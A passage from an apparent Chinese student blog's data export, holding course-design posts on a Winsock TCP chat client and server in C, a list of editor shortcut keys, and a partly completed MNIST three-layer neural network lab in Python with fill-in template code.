SOCK_STREAM , IPPOTO_IP );local.sin_family = AF_INET; local.sin_addr = htonl( INADDR_ANY ); local.sin_port = htons( port ); bind( sListen , (struct sockaddr*)&amp;local , sizeof( local ) );listen( sListen , 5 ); sClient = accept( sListen , (struct sockaddr*)&amp;client , &amp;iAddrSize ); 客户端的创建： 12345678910111213141516WSADATA wsd; SOCKET sClient;UINT port = 800;char szIp[] = &quot;127.0.0.1&quot;;int iAddrSize; struct sockaddr_in server;WSAStartup( 0x11 , &amp;wsd ); sClient = Socket ( AF_INET , SOCK_STREAM , IPPOTO_IP );server.sin_family = AF_INET;server.sin_addr = inet_addr( szIp );server.sin_port = htons( port ); connect( sClient , (struct sockaddr*)&amp;server , sizeof( server ) ); 当服务器端和客户端建立连接以后，无论是客户端，还是服务器端都可以使用 12int send( SOCKET s,const char FAR* buf,int len,int flags);int recv( SOCKET s,char FAR* buf,int len,int flags); 函数来接收和发送数据，因为，TCP 连接是双向的。当要关闭通讯连接的时候，任何一方都可以调用 1int shutdown(SOCKET s,int how); 来关闭套接字的指定功能，再调用 1int closeSocket(SOCKET s) ; 来关闭套接字句柄，这样一个通讯过程就算完成了。可以参考教材计算机网络（第 6 版）295 页图 6-32 所示的系统调用使用顺序： 注意：上面的代码没有任何检查函数返回值，如果你作网络编程就一定要检查任何一个 WinSock API 函数的调用结果，因为很多时候函数调用并不一定成功。上面介绍的函数，返回值类型是 int 的话，如果函数调用失败的话，返回的都是 SOCKET_ERROR。 4．VC中socket编程步骤sockets（套接字）编程有三种，流式套接字（SOCK_STREAM），数据报套接字（SOCK_DGRAM）， 原始套接字（SOCK_RAW）；基于 TCP 的 socket 编程是采用的流式套接字。在这个程序中，将两个工程添加到一个工作区。要链接一个 ws2_32.lib 的库文件**(#pragma comment(lib,”ws2_32”))**。服务器端编程的步骤： 1：加载套接字库，创建套接字(WSAStartup()/socket())； 2：绑定套接字到一个 IP 地址和一个端口上(bind())； 3：将套接字设置为监听模式等待连接请求(listen())； 4：请求到来后，接受连接请求，返回一个新的对应于此次连接的套接字(accept())； 5：用返回的套接字和客户端进行通信(send()/recv())； 6：返回，等待另一连接请求； 7：关闭套接字，关闭加载的套接字库(closesocket()/WSACleanup())。 服务器端代码如下： 12345678910111213141516171819202122232425262728293031323334#include &lt;stdio.h&gt;#include &lt;Winsock2.h&gt; void main() &#123; WORD wVersionRequested; WSADATA wsaData; int err; wVersionRequested = MAKEWORD( 1, 1 ); err = WSAStartup( wVersionRequested, &amp;wsaData ); if ( err != 0 ) &#123; return; &#125; if ( LOBYTE( wsaData.wVersion ) != 1 || HIBYTE( wsaData.wVersion ) != 1 ) &#123; WSACleanup( ); return; &#125; SOCKET sockSrv=socket(AF_INET,SOCK_STREAM,0); SOCKADDR_IN addrSrv; addrSrv.sin_addr.S_un.S_addr=htonl(INADDR_ANY); addrSrv.sin_family=AF_INET; addrSrv.sin_port=htons(6000); bind(sockSrv,(SOCKADDR*)&amp;addrSrv,sizeof(SOCKADDR)); listen(sockSrv,5); SOCKADDR_IN addrClient; int len=sizeof(SOCKADDR); while(1)&#123; SOCKET sockConn=accept(sockSrv,(SOCKADDR*)&amp;addrClient,&amp;len); char sendBuf[50]; sprintf(sendBuf,&quot;Welcome %s to here!&quot;,inet_ntoa(addrClient.sin_addr)); send(sockConn,sendBuf,strlen(sendBuf)+1,0); char recvBuf[50]; recv(sockConn,recvBuf,50,0); printf(&quot;%s\\n&quot;,recvBuf); closesocket(sockConn); &#125; &#125; 客户端编程的步骤： 1：加载套接字库，创建套接字(WSAStartup()/socket())； 2：向服务器发出连接请求(connect())； 3：和服务器端进行通信(send()/recv())； 4：关闭套接字，关闭加载的套接字库(closesocket()/WSACleanup())。 客户端的代码如下： 123456789101112131415161718192021222324252627282930313233#include &lt;stdio.h&gt;#include &lt;Winsock2.h&gt;void main() &#123; WORD wVersionRequested; WSADATA wsaData; int err; wVersionRequested = MAKEWORD( 1, 1 ); err = WSAStartup( wVersionRequested, &amp;wsaData ); if ( err != 0 ) &#123; return; &#125; if ( LOBYTE( wsaData.wVersion ) != 1 || HIBYTE( wsaData.wVersion ) != 1 ) &#123; WSACleanup( ); return; &#125; SOCKET sockClient=socket(AF_INET,SOCK_STREAM,0); SOCKADDR_IN addrSrv; addrSrv.sin_addr.S_un.S_addr=inet_addr(&quot;127.0.0.1&quot;); addrSrv.sin_family=AF_INET; addrSrv.sin_port=htons(6000); connect(sockClient,(SOCKADDR*)&amp;addrSrv,sizeof(SOCKADDR)); send(sockClient,&quot;hello&quot;,strlen(&quot;hello&quot;)+1,0); char recvBuf[50]; recv(sockClient,recvBuf,50,0); printf(&quot;%s\\n&quot;,recvBuf); closesocket(sockClient); WSACleanup(); &#125; 设计步骤sockets（套接字）编程有三种，流式套接字（SOCK_STREAM），数据报套接字（SOCK_DGRAM），原始套接字（SOCK_RAW）；基于 TCP 的 socket 编程是采用的流式套接字。在这个程序中，将两个工程添加到一个工作区。要链接一个 ws2_32.lib 的库文件(#pragma comment(lib,“ws2_32”))。服务器端编程的步骤：1：加载套接字库，创建套接字(WSAStartup()/socket())；2：绑定套接字到一个 IP 地址和一个端口上(bind())；3：将套接字设置为监听模式等待连接请求(listen())；4：请求到来后，接受连接请求，返回一个新的对应于此次连接的套接字(accept())；5：开启新线程调用_beginthread(input,0,sockConn);6：用返回的套接字和客户端进行通信(send()/recv())；7：返回，等待另一连接请求；8：关闭套接字，关闭加载的套接字库(closesocket()/WSACleanup())。客户端编程的步骤：1：加载套接字库，创建套接字(WSAStartup()/socket())；2：向服务器发出连接请求(connect())；3：开启新线程调用_beginthread(input,0,sockClient);4：和服务器端进行通信(send()/recv())；5：关闭套接字，关闭加载的套接字库(closesocket()/WSACleanup())。 调试过程出师不利，由于忘记了进程的相互调用，直接将两份c文件放在了同一个工程文件夹里面。这就导致悲剧的发生，函数冲突。寻找到问题根源，苦思冥想，花费一个半小时寻求调试方法。最后看到操作系统课程设计的报告，方顿悟要将两份c文件编译成.exe文件，然后直接点击.exe文件，而不是在codeblocks里面调试。 在解决完这个问题后，我遇到了另一个问题，编译时出现undefined reference to 系列错误。查阅资料后，找到原因：缺少lib库，编译找不到相应的lib库。在这里贴上原作者解决问题的帖子：错误解决. 线程为时分复用，可以极大提高程序效率，所以我们用多线程网络编程来处理。在主函数调用_beginthread()方法开启多线程，在服务端需要传输accept()方法建立的和客户端有联系的sockConn，而客户端需要传输connect()方法建立的和服务端有联系的sockClient。一番操作下来，程序成功运行。 设计结果及结果分析将c文件编译成.exe文件，如图所示 接下来我们点击network2，再点击network，效果如图所示： 客户端键入消息： 服务器回应： 客户端下线： 客户端下线后： 完整代码client： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#include &lt;stdio.h&gt;#include &lt;Winsock2.h&gt;#pragma comment (lib,&quot;ws2_32.lib&quot;)#include &lt;time.h&gt;#include &lt;process.h&gt;//客户端void input(SOCKET sockClient)//客户端输入新线程&#123; while(1) &#123; char kh[50]=&quot;&quot;; printf(&quot;%s\\n&quot;,&quot;可爱的客户端输入:&quot;); scanf(&quot;%s&quot;,kh); send(sockClient,kh,strlen(kh),0); &#125;&#125;void main()&#123; WORD wVersionRequested; WSADATA wsaData; int err; wVersionRequested = MAKEWORD( 1, 1 ); err = WSAStartup( wVersionRequested, &amp;wsaData ); if ( err != 0 ) &#123; return; &#125; if ( LOBYTE( wsaData.wVersion ) != 1 || HIBYTE( wsaData.wVersion ) != 1 ) &#123; WSACleanup( ); return; &#125; SOCKET sockClient=socket(AF_INET,SOCK_STREAM,0); SOCKADDR_IN addrSrv; addrSrv.sin_addr.S_un.S_addr=inet_addr(&quot;127.0.0.1&quot;); addrSrv.sin_family=AF_INET; addrSrv.sin_port=htons(6000); //connect( sClient , (struct sockaddr*)&amp;server , sizeof( server ) ) connect(sockClient,(SOCKADDR*)&amp;addrSrv,sizeof(SOCKADDR)); //服务器和客户端之间正常的传输 _beginthread(input,0,sockClient); char beg[50]=&quot;让我们开始愉快的唠嗑吧！\\n&quot;; send(sockClient,beg,strlen(beg),0); while(1) &#123; char recvBuf[50]=&quot;&quot;;//清空之前存储的数据 int n=recv(sockClient,recvBuf,50,0); if(n&lt;0)//服务器端停止 &#123; printf(&quot;%s\\n&quot;,&quot;威武的服务器:&quot;); printf(&quot;%s&quot;,&quot;威武的服务器已离线，您也可以选择退出关闭对话框下线！&quot;); _endthread(); break; &#125; printf(&quot;%s\\n&quot;,&quot;威武的服务器消息:&quot;); printf(&quot;%s\\n&quot;,recvBuf); &#125; closesocket(sockClient); WSACleanup();&#125; server： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081#include &lt;stdio.h&gt;#include &lt;Winsock2.h&gt;#pragma comment(lib, &quot;ws2_32.lib&quot;) // winsock实现#include &lt;time.h&gt;#include &lt;process.h&gt;//服务器端void input(SOCKET sockConn)//服务器端输入新线程&#123; while(1) &#123; char skh[50]=&quot;&quot;; printf(&quot;%s\\n&quot;,&quot;威武的服务器输入:&quot;); scanf(&quot;%s&quot;,skh); send(sockConn,skh,strlen(skh),0); &#125;&#125;void main()&#123; WORD wVersionRequested;// 双字节，winsock库的版本 WSADATA wsaData;// winsock库版本的相关信息 int err; wVersionRequested = MAKEWORD( 1, 1 );// 0x0101 即:257 err = WSAStartup( wVersionRequested, &amp;wsaData );// 加载winsock库并确定winsock版本，系统会把数据填入wsaData中 if ( err != 0 )//初始化winsock失败 &#123; return; &#125; if ( LOBYTE( wsaData.wVersion ) != 1 || HIBYTE( wsaData.wVersion ) != 1 )//判断版本匹配 &#123; WSACleanup( ); return; &#125; // AF_INET 表示采用TCP/IP协议族 // SOCK_STREAM 表示采用TCP协议 // 0是通常的默认情况 SOCKET sockSrv=socket(AF_INET,SOCK_STREAM,0); SOCKADDR_IN addrSrv; addrSrv.sin_addr.S_un.S_addr=htonl(INADDR_ANY);//INADDR_ANY对本地任意ip地址，inet_addr(&quot;0.0.0.0&quot;) addrSrv.sin_family=AF_INET;// TCP/IP协议族 addrSrv.sin_port=htons(6000);//socket对应的端口 //sockaddr常用于bind、connect、recvfrom、sendto等函数的参数，指明地址信息，是一种通用的套接字地址，与sockaddr_in二者长度一样 bind(sockSrv,(SOCKADDR*)&amp;addrSrv,sizeof(SOCKADDR)); //将socket绑定到某个IP和端口（IP标识主机，端口标识通信进程） listen(sockSrv,5);// 将socket设置为监听模式，5表示等待连接队列的最大长度 //一般先把sockaddr_in变量赋值后，强制类型转换后传入用sockaddr做参数的函数：sockaddr_in用于socket定义和赋值；sockaddr用于函数参数。 SOCKADDR_IN addrClient; int len=sizeof(SOCKADDR); SOCKET sockConn=accept(sockSrv,(SOCKADDR*)&amp;addrClient,&amp;len);//第二个参数接收的是客户端的connect中的第二个参数server // sockSrv为监听状态下的socket // &amp;addrClient是缓冲区地址，保存了客户端的IP和端口等信息 // len是包含地址信息的长度 // 如果客户端没有启动，那么程序一直停留在该函数处 // accept(sListen , (struct sockaddr*)&amp;client , &amp;iAddrSize) //服务器和客户端之间正常的传输 char sendBuf[50]; char pd; sprintf(sendBuf,&quot;欢迎 %s !我们开始唠嗑吧！\\n&quot;,inet_ntoa(addrClient.sin_addr));//inet_ntoa(addrClient.sin_addr)表示客户端的IP地址 send(sockConn,sendBuf,strlen(sendBuf),0);// 发送数据到客户端，最后一个参数一般设置为0 _beginthread(input,0,sockConn); while(1) &#123; char recvBuf[50]=&quot;&quot;;//清空之前存储的数据 int n=recv(sockConn,recvBuf,50,0);// 接收客户端数据，最后一个参数一般设置为0 if(n&lt;0)//客户端停止 &#123; printf(&quot;%s\\n&quot;,&quot;可爱的客户端:&quot;); printf(&quot;%s&quot;,&quot;可爱的客户端已离线，您也可以选择退出关闭对话框下线！&quot;); _endthread(); break; &#125; printf(&quot;%s\\n&quot;,&quot;可爱的客户端消息:&quot;); printf(&quot;%s\\n&quot;,recvBuf);//输出服务器端从客户端接收的数据 &#125; closesocket(sockConn);&#125;","comments":true,"categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://1905060202.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"课程设计","slug":"课程设计","permalink":"http://1905060202.github.io/tags/%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/"},{"name":"计算机网络","slug":"计算机网络","permalink":"http://1905060202.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"}]},{"title":"对于写程序极好的快捷键","date":"2021-12-06T05:15:36.000Z","path":"2021/12/06/对于写程序极好的快捷键/","text":"写在前面废话不多说，直接用就完了。 IDEA中极好用的快捷键复制Ctrl + D 复制光标所在行 或 复制选择内容，并把复制内容插入光标位置下面 （必备） Ctrl + W 递进式选择代码块。可选中光标所在的单词或段落，连续按会在原有选中的基础上再扩展选中范围 （必备） 删除Ctrl + Y 删除光标所在行 或 删除选中的行 （必备） Windows10极好用的快捷键切换Alt+Tab 切换进程","comments":true,"categories":[{"name":"经验分享","slug":"经验分享","permalink":"http://1905060202.github.io/categories/%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"小妙招","slug":"小妙招","permalink":"http://1905060202.github.io/tags/%E5%B0%8F%E5%A6%99%E6%8B%9B/"}]},{"title":"计算智能课程设计(基于神经网络的手写数字识别)","date":"2021-12-06T00:23:27.000Z","path":"2021/12/06/计算智能课程设计-基于神经网络的手写数字识别/","text":"写在前面眨眼间，一周的时间从指间悄然流逝。今天要做的是“基于神经网络的手写数字识别”。2021.12.6 基于神经网络的手写数字识别实验目的掌握神经网络的设计原理，熟练掌握神经网络的训练和使用方法，能够使用Python语言，针对手写数字分类的训练和使用，实现一个三层全连接神经网络模型。具体包括：1）实现三层神经网络模型来进行手写数字分类，建立一个简单而完整的神经网络工程。通过本实验理解神经网络中基本模块的作用和模块间的关系，为后续建立更复杂的神经网络实验奠定基础。2）利用Python实现神经网络基本单元的前向传播（正向传播）和反向传播，加深对神经网络中基本单元的理解，包括全连接层、激活函数、损失函数等基本单元。3）利用Python实现神经网络的构建和训练，实现神经网络所使用的梯度下降算法，加深对神经网络训练过程的理解。 背景知识神经网络的组成一个完整的神经网络通常由多个基本的网络层堆叠而成。本实验中的三层全连接神经网络由三个全连接层构成，在每两个全连接层之间插入 ReLU 激活函数以引入非线性变换,最后使用 Softmax 层计算交叉熵损失，如图 2.1 所示。因此本实验中使用的基本单元包括全连接层、ReLU 激活函数、Softmax 损失函数。 全连接层全连接层以一维向量作为输入，输入与权重相乘后再与偏置相加得到输出向量。假设全连接层的输入为 m维列向量 x，输出为 n 维列向量 y。 全连接层的权重 W 是二维矩阵，维度为 m×n,偏置 b 是 n 维列向量。前向传播时，全连接层的输出的计算公式为(注意偏置可以是向量，计算每一个输出使用不同的值；偏置也可以是一个标量，计算同一层的输出使用同一个值) UReLU激活函数 Softmax 损失层 神经网络训练 示例代码数据集数据集采用 MNIST 手写数字库(老师直接提供，也可在 http://yann.lecun.com/exdb/mnist/自行下载)。该数据集包含一个训练集和一个测试集，其中训练集有 60000 个样本，测试集有 10000 个样本。每个样本都由灰度图像（即单通道图像）及其标记组成，图像大小为 28×28。MNIST 数据集包含 4 个文件，分别是训练集图像、训练集标记、测试集图像、测试集标记 。 总体设计设计一个三层神经网络实现手写数字图像分类。该网络包含两个隐层和一个输出层,其中输入神经元个数由输入数据维度决定，输出层的神经元个数由数据集包含的类别决定,两个隐层的神经元个数可以作为超参数自行设置。对于手写数字图像的分类问题，输入数据为手写数字图像，原始图像一般可表示为二维矩阵（灰度图像）或三维矩阵（彩色图像）,在输入神经网络前会将图像矩阵调整为一维向量作为输入。待分类的类别数一般是提前预设的，如手写数字包含 0 至 9 共 10 个类别，则神经网络的输出神经元个数为 10。 为了便于迭代开发，工程实现时采用模块化的方式来实现整个神经网络的处理,共划分为5大模块： 1）数据加载模块：从文件中读取数据，并进行预处理，其中预处理包括归一化、维度变换等处理。如果需要人为对数据进行随机数据扩增，则数据扩增处理也在数据加载模块中实现。2）基本单元模块：实现神经网络中不同类型的网络层的定义、前向传播、反向传播等功能。3）网络结构模块：利用基本单元模块建一个完整的神经网络。4）网络训练（training）模块：用训练集对神经网络进行训练。对建立的神经网络结构，实现神经网络的前向传播、神经网络的反向传播、对神经网络进行参数更新、保存神经网络参数等基本操作，以及训练函数主体。5）网络推断（inference）模块：使用训练得到的网络模型，对测试样本进行预测（也称为测试或推断）。具体操作包括加载训练得到的模型参数、神经网络的前向传播等。 数据加载模块本实验釆用的数据集是MNIST手写数字库。该数据集中的图像数据和标记数据采用表2.1中的IDX文件格式存放。图像的像素值按行优先顺序存放，取值范围为［0,255］,其中0表示黑色，255表示白色。 首先编写读取 MNIST 数据集文件并预处理的子函数，程序示例如下所示。 1234567891011121314151617181920def load_mnist(self, file_dir, is_images = &#x27;True&#x27;): # Read binary data bin_file = open(file_dir, &#x27;rb&#x27;) bin_data = bin_file.read() bin_file.close() # Analysis file header if is_images: # Read images fmt_header = &#x27;&gt;iiii&#x27; magic, num_images, num_rows, num_cols = struct.unpack_from(fmt_header, bin_data, 0) else: # Read labels fmt_header = &#x27;&gt;ii&#x27; magic, num_images = struct.unpack_from(fmt_header, bin_data, 0) num_rows, num_cols = 1, 1 data_size = num_images * num_rows * num_cols mat_data = struct.unpack_from(&#x27;&gt;&#x27; + str(data_size) + &#x27;B&#x27;, bin_data, struct.calcsize(fmt_header)) mat_data = np.reshape(mat_data, [num_images, num_rows * num_cols]) print(&#x27;Load images from %s, number: %d, data shape: %s&#x27; % (file_dir, num_images, str(mat_data.shape))) return mat_data 然后调用该子函数对 MN1ST 数据集中的 4 个文件分别进行读取和预处理，并将处理过的训练和测试数据存储在 NumPy矩阵中（训练模型时可以快速读取该矩阵中的数据）。实现该功能的程序示例如下 所示。 12345678910def load_data(self): # TODO: 调用函数 load_mnist 读取和预处理 MNIST 中训练数据和测试数据的图像和标记 print(&#x27;Loading MNIST data from files...&#x27;) train_images = self.load_mnist(os.path.join(MNIST_DIR, TRAIN_DATA), True) train_labels = #Your Code Here# test_images = #Your Code Here# test_labels = #Your Code Here# self.train_data = np.append(train_images, train_labels, axis=1) self.test_data = np.append(test_images, test_labels, axis=1) # self.test_data = np.concatenate((self.train_data, self.test_data), axis=0) TODO 提示：代码中已有如下定义，直接按照 train_images 的代码套用即可：TRAIN_DATA = “train-images-idx3-ubyte”TRAIN_LABEL = “train-labels-idx1-ubyte”TEST_DATA = “t10k-images-idx3-ubyte”TEST_LABEL = “t10k-labels-idx1-ubyte” 基本单元模块 全连接层的实现示例： 12345678910111213141516171819202122232425262728293031class FullyConnectedLayer(object): def __init__(self, num_input, num_output): # 全连接层初始化 self.num_input = num_input self.num_output = num_output print(&#x27;\\tFully connected layer with input %d, output %d.&#x27; % (self.num_input, self.num_output)) def init_param(self, std=0.01): # 参数初始化 self.weight = np.random.normal(loc=0.0, scale=std, size=(self.num_input, self.num_output)) self.bias = np.zeros([1, self.num_output]) def forward(self, input): # 前向传播计算 start_time = time.time() self.input = input # TODO：全连接层的前向传播，计算输出结果 self.output = #Your Code Here# return self.output def backward(self, top_diff): # 反向传播的计算 # TODO：全连接层的反向传播，计算参数梯度和本层损失 self.d_weight = #Your Code Here# self.d_bias = #Your Code Here# bottom_diff = #Your Code Here# return bottom_diff def update_param(self, lr): # 参数更新 # TODO：对全连接层参数利用参数进行更新 self.weight = #Your Code Here# self.bias = #Your Code Here# def load_param(self, weight, bias): # 参数加载 assert self.weight.shape == weight.shape assert self.bias.shape == bias.shape self.weight = weight self.bias = bias def save_param(self): # 参数保存 return self.weight, self.bias 1234567891011121314class ReLULayer(object): def __init__(self): print(&#x27;\\tReLU layer.&#x27;) def forward(self, input): # 前向传播的计算 start_time = time.time() self.input = input # TODO：ReLU层的前向传播，计算输出结果 output = #Your Code Here# return output def backward(self, top_diff): # 反向传播的计算 # TODO：ReLU层的反向传播，计算本层损失 bottom_diff = #Your Code Here# bottom_diff[self.input&lt;0] = 0 return bottom_diff 1234567891011121314151617181920class SoftmaxLossLayer(object): def __init__(self): print(&#x27;\\tSoftmax loss layer.&#x27;) def forward(self, input): # 前向传播的计算 # TODO：softmax 损失层的前向传播，计算输出结果 input_max = np.max(input, axis=1, keepdims=True) input_exp = np.exp(input - input_max) self.prob = #Your Code Here# return self.prob def get_loss(self, label): # 计算损失 self.batch_size = self.prob.shape[0] self.label_onehot = np.zeros_like(self.prob) self.label_onehot[np.arange(self.batch_size), label] = 1.0 loss = -np.sum(np.log(self.prob) * self.label_onehot) / self.batch_size return loss def backward(self): # 反向传播的计算 # TODO：softmax 损失层的反向传播，计算本层损失 bottom_diff = #Your Code Here# return bottom_diff 网络结构模块 12345678910111213141516171819202122232425class MNIST_MLP(object): def __init__(self, batch_size=100, input_size=784, hidden1=32, hidden2=16, out_classes=10, lr=0.01, max_epoch=2, print_iter=100): # 神经网络初始化 self.batch_size = batch_size self.input_size = input_size self.hidden1 = hidden1 self.hidden2 = hidden2 self.out_classes = out_classes self.lr = lr self.max_epoch = max_epoch self.print_iter = print_iter def build_model(self): # 建立网络结构 # TODO：建立三层神经网络结构 print(&#x27;Building multi-layer perception model...&#x27;) self.fc1 = FullyConnectedLayer(self.input_size, self.hidden1) self.relu1 = ReLULayer() #Your Code Here# #Your Code Here# self.fc3 = FullyConnectedLayer(self.hidden2, self.out_classes) self.softmax = SoftmaxLossLayer() self.update_layer_list = [self.fc1, self.fc2, self.fc3] def init_model(self): print(&#x27;Initializing parameters of each layer in MLP...&#x27;) for layer in self.update_layer_list: layer.init_param() 网络训练（ training）神经网络训练流程如图2.9所示。在完成数据加载模块和网络结构模块实现之后，需要实现训练模块。本实验中三层神经网络的网络训练模块程序示例如图2.10所示。神经网络的训练模块通常拆解为若干步骤，包括神经网络的前向传播、神经网络的反向传播、神经网络参数更新、神经网络参数保存等基本操作。这些网络训练模块的基本操作以及训练主体用神经网络类的成员函数来定义： 12345678910111213141516171819202122232425262728293031323334353637def forward(self, input): # 神经网络的前向传播 # TODO：神经网络的前向传播 h1 = self.fc1.forward(input) h1 = self.relu1.forward(h1) #Your Code Here# #Your Code Here# #Your Code Here# prob = self.softmax.forward(h3) return probdef backward(self): # 神经网络的反向传播 # TODO：神经网络的反向传播 dloss = self.softmax.backward() #Your Code Here# #Your Code Here# #Your Code Here# dh1 = self.relu1.backward(dh2) dh1 = self.fc1.backward(dh1)def update(self, lr): # 神经网络的参数更新 for layer in self.update_layer_list: layer.update_param(lr)def train(self): # 训练函数 max_batch = self.train_data.shape[0] // self.batch_size print(&#x27;Start training...&#x27;) for idx_epoch in range(self.max_epoch): self.shuffle_data() for idx_batch in range(max_batch): batch_images = self.train_data[idx_batch*self.batch_size:(idx_batch+1)*self.batch_size, :-1] batch_labels = self.train_data[idx_batch*self.batch_size:(idx_batch+1)*self.batch_size, -1] prob = self.forward(batch_images) loss = self.softmax.get_loss(batch_labels) self.backward() self.update(self.lr) if idx_batch % self.print_iter == 0: print(&#x27;Epoch %d, iter %d, loss: %.6f&#x27; % (idx_epoch, idx_batch, loss)) 网络推断（ inference ）整个神经网络推断流程如图2.11所示。完成神经网络的训练之后，可以用训练得到的模型对测试数据进行预测，以评估模型的精度。工程实现中同样常将一个神经网络的推断模块拆解为若干步骤，包括神经网络模型参数加载、前向传播、精度计算等基本操作。这些网络推断模块的基本操作以及推断主体用神经网络类的成员函数来定义： •神经网络的前向传播：网络推断模块中的神经网络前向传播操作与网络训练模块中的前向传播操作完全一致，因此可以直接调用网络训练模块中的神经网络前向传播函数。•神经网络参数加载：读取神经网络训练模块保存的模型参数文件，并加载有参数的网络层的参数值。•神经网络推断函数主体：在进行神经网络推断前，需要从模型参数文件中加载神经网络的参数。在神经网络推断过程中，循环每次读取一定批量的测试数据，随后进行整个神经网络的前向传播计算得到神经网络的输出结果。得到整个测试数据集的输出结果后，与测试数据集的标记进行比对，利用相关的评价函数计算模型的精度，如手写数字分类问题使用分类平均正确率作为模型的评函数。 123456789101112131415161718def load_model(self, param_dir): # 加载神经网络权值 print(&#x27;Loading parameters from file &#x27; + param_dir) params = np.load(param_dir, allow_pickle=True).item() self.fc1.load_param(params[&#x27;w1&#x27;], params[&#x27;b1&#x27;]) self.fc2.load_param(params[&#x27;w2&#x27;], params[&#x27;b2&#x27;]) self.fc3.load_param(params[&#x27;w3&#x27;], params[&#x27;b3&#x27;]) def evaluate(self): #推断函数 pred_results = np.zeros([self.test_data.shape[0]]) start_time = time.time() for idx in range(self.test_data.shape[0]//self.batch_size): batch_images = self.test_data[idx*self.batch_size:(idx+1)*self.batch_size, :-1] prob = self.forward(batch_images) end = time.time() pred_labels = np.argmax(prob, axis=1) pred_results[idx*self.batch_size:(idx+1)*self.batch_size] = pred_labels print(&quot;All evaluate time: %f&quot;%(time.time()-start_time)) accuracy = np.mean(pred_results == self.test_data[:,-1]) print(&#x27;Accuracy in test set: %f&#x27; % accuracy) 完整实验流程完成神经网络的各个模块之后，调用这些模块就可以实现用三层神经网络进行手写数字图像分类的完整流程。。首先实例化三层神经网络对应的类，指定神经网络的超参数，如每层的神经元个数。其次进行数据的加载和预处理。再调用网络结构模块建立神经网络，随后进行网络初始化，在该过程中网络结构模块会自动调用基本单元模块实例化神经网络中的每个层。然后调用网络训练模块训练整个网络，之后将训练得到的模型参数保存到文件中。最后从文件中读取训练得到的模型参数，之后调用网络推断模块测试网络的精度。 123456789101112if __name__ == &#x27;__main__&#x27;: h1, h2, e = 32, 16, 1 mlp = MNIST_MLP(hidden1=h1, hidden2=h2, max_epoch=e) mlp.load_data() mlp.build_model() mlp.init_model() start_time = time.time() mlp.train() print(&quot;All train time: %f&quot;%(time.time()-start_time)) mlp.save_model(&#x27;mlp-%d-%d-%depoch.npy&#x27; % (h1, h2, e)) mlp.load_model(&#x27;mlp-%d-%d-%depoch.npy&#x27; % (h1, h2, e)) mlp.evaluate() 实验评估 实验内容1）请在代码中有TODO的地方填空，将程序补充完整，在报告中写出相应代码，并给出自己的理解。2） mlp.load_data()执行到最后时，train_images、train_labels、test_images、test_labels 的维度是多少？即多少行多少列，用(x,y)来表示。self.train_data 和 self.test_data 的维度是多少？3）本案例中的神经网络一共有几层？每层有多少个神经元？如果要增加或减少层数，应该怎么做（简单描述即可不用编程）？如果要增加或减少某一层的节点，应该怎么做（简单描述）？如果要把 softmax 换成 sigmoid，应该怎么做（简单描述）？4） 在 train()函数中，max_batch = self.train_data.shape[0] // self.batch_size 这一句的意义是什么？self.shuffle_data()的意义是什么？ 5）最 终 evaluate()函数输出的 Accuracy in test set 是多少？请想办法提高该数值。本小题的评估标准设定如下：• 60 分标准：给定全连接层、ReLU 层、Softmax 损失层的前向传播的输入矩阵、参数值、反向传播的输入，可以得到正确的前向传播的输出矩阵、反向传播的输出和参数梯度。• 80 分标准：实现正确的三层神经网络，并进行训练和推断，使最后训练得到的模型在 MNIST测试数据集上的平均分类正确率高于 92%。• 90 分标准：实现正确的三层神经网络，并进行训练和推断，调整和训练相关的超参数,使最后训练得到的模型在 MNIST 测试数据集上的平均分类正确率高于 95%。• 100 分标准：在三层神经网络基础上设计自己的神经网络结构，并进行训练和推断，使最后训练得到的模型在 MN1ST测试数据集上的平均分类正确率高于 98%。 实验结果与分析步骤解析数据加载模块12345678910def load_data(self): # TODO: 调用函数 load_mnist 读取和预处理 MNIST 中训练数据和测试数据的图像和标记 print(&#x27;Loading MNIST data from files...&#x27;) train_images = self.load_mnist(os.path.join(MNIST_DIR, TRAIN_DATA), True) train_labels = self.load_mnist(os.path.join(MNIST_DIR,TRAIN_LABEL),False) test_images = self.load_mnist(os.path.join(MNIST_DIR,TEST_DATA),True) test_labels = self.load_mnist(os.path.join(MNIST_DIR,TEST_LABEL ),False) self.train_data = np.append(train_images, train_labels, axis=1) self.test_data = np.append(test_images, test_labels, axis=1) # self.test_data = np.concatenate((self.train_data, self.test_data), axis=0) 加载数据集，train_labels、train_images、test_images、test_labels。MNIST_DIR用于定位文件，True代表加载图像，False代表加载标签。 基本单元模块全连接层123456789101112131415161718192021222324252627282930313233343536373839class FullyConnectedLayer(object): def __init__(self, num_input, num_output): # 全连接层初始化 self.num_input = num_input self.num_output = num_output print(&#x27;\\tFully connected layer with input %d, output %d.&#x27; % (self.num_input, self.num_output)) def init_param(self, std=0.01): # 参数初始化 self.weight = np.random.normal(loc=0.0, scale=std, size=(self.num_input, self.num_output)) self.bias = np.zeros([1, self.num_output]) def forward(self, input): # 前向传播计算 start_time = time.time() self.input = input # TODO：全连接层的前向传播，计算输出结果 self.output = #Your Code Here# return self.output def backward(self, top_diff): # 反向传播的计算 # TODO：全连接层的反向传播，计算参数梯度和本层损失 #Your Code Here# self.d_weight = np.dot(self.input.T,top_diff) self.d_bias = top_diff bottom_diff = np.dot(top_diff,self.weight.T) #Your Code Here# return bottom_diff def update_param(self, lr): # 参数更新 # TODO：对全连接层参数利用参数进行更新 #Your Code Here# self.weight = self.weight-lr*self.d_weight self.bias = self.bias-lr*self.d_bias #Your Code Here# def load_param(self, weight, bias): # 参数加载 assert self.weight.shape == weight.shape assert self.bias.shape == bias.shape self.weight = weight self.bias = bias def save_param(self): # 参数保存 return self.weight, self.bias ReLU层12345678910111213141516171819202122class ReLULayer(object): def __init__(self): print(&#x27;\\tReLU layer.&#x27;) def forward(self, input): # 前向传播的计算 start_time = time.time() self.input = input # TODO：ReLU层的前向传播，计算输出结果 #Your Code Here# output = np.maximum(self.input,0) #Your Code Here# return output def backward(self, top_diff): # 反向传播的计算 # TODO：ReLU层的反向传播，计算本层损失 #Your Code Here# bottom_diff = top_diff #Your Code Here# 